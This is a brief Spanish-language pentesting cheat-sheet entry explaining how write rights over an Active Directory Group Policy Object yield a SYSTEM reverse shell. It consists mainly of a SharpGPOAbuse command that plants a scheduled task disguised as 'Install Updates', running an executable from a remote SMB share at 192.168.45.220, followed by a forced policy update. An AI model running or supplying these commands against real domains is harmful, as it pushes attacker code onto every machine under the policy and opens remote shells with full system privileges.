# Info

Si tenemos permisos de GenericAll o GenericWrite sobre una GPO, podemos conseguir una reverseshell como System en una computadora:


    .\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\192.168.45.220\CompData\msiexec.exe" --GPOName "Default Domain Policy"

Luego:

    gpupdate /force

